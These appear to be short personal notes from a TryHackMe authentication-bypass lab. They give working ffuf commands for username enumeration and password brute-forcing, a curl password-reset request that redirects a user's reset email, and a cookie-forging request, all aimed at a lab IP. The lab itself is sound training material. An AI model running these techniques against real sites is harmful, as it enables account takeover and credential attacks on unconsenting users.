
## Username Enumeration

`user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.241.16/customers/signup -mr "username already exists"`
        
returned: 
admin                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 67ms]
robert                  [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 48ms]
simon                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 56ms]
steve                   [Status: 200, Size: 3720, Words: 992, Lines: 77, Duration: 74ms]


- save names in a file called valid_usernames.txt, then run: 

`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.241.16/customers/login -fc 200`


## reset password bypass

curl 'http://10.10.241.16/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={username}@customer.acmeitsupport.thm' 


## set cookies from curl

`curl -H "Cookie: logged_in=true; admin=true" http://10.10.241.16/cookie-test`